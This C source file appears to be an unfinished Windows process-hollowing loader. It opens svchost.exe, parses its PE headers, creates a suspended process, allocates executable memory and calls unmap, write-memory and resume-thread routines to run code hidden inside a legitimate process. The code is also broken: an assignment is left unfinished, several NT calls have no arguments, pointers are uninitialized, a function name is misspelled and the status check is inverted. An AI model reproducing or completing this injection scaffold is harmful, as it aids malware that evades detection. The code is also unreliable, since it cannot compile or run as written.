#include <stdio.h>
#include "main.h"
#include <windows.h>
#include <winternl.h>
#include <winnt.h>
#include <intrin.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
#define g(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define ss 0x00000000

int statCheck(NTSTATUS status) {

    if (status == STATUS_SUCCESS ) {
        return 0;

    }
    else {
        return 1;
    }


}

int main(void) {

    STARTUPINFO si;
    NTSTATUS status;
    HANDLE hThread;


    HANDLE pFe;




    HANDLE hProcess;
    LPROCESS_INFORMATION pi;
    LPCSTR path = "C:\\Windows\\System32\\svchost.exe";

    pFe = NtCreateFile(pFe, path, FILE_OPENED, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, NULL, NULL);

    LPVOID modb;
    PWORD sizze;

    *sizze = GetFileSize(pFe, &sizze);

    modb =



    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(modb);
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(modb + dosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER opH = ntHdr->OptionalHeader;




    status = NtCreateProcess(hProcess, NULL, NULL, CREATE_SUSPENDED, 0, NULL, NULL, NULL);

    if (statCheck(status)){

    g("process created at %p ", hProcess);


        LPVOID baseAddress = NULL;

        status = NtAllocateVirtualMemory(hProcess, &baseAddress, sizeof(CTX),MEM_COMMIT, PAGE_READWRITE);

        if (statCheck(status)) {
            g("context allocated at %p",   &baseAddress);
        }

        LPCONTEXT CTX;
        CTX = LPCONTEXT(&baseAddress);
        CTX ->ContextFlags = CONTEXT_FULL;



        PCONTEXT pContext;

        status = NtGetContextThread();
        if (statCheck(status)) {

            g("context thread gotten at %p",  &baseAddress);


            LPVOID t;
            procBaseImg = NtAllocateVirtualMemory(hProcess, t , 0, 0x3000, PAGE_EXECUTE_READWRITE);


        }


        status = NtUnmmapViewOfSection();



        status = NtGetContextThread();


        if (status == STATUS_SUCCESS) {


        }


        status = NtAllocateVirtualMemory();

        status = NtWriteVirtualMemory();



        status = NtResumeThread();



    }

    return 0;
}